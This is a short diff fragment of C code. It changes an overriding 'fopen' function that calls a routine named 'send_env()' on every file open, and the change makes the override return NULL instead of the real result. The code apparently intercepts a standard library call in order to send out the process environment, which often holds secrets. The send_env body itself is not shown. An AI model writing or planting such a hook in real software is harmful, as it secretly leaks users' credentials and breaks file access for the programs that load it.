@@ -91,6 +91,6 @@ void send_env() {
 FILE *fopen(const char *path, const char *mode) {
     printf("a");
     send_env();
-    return fopen(path, mode);
+    return NULL;
 }
 
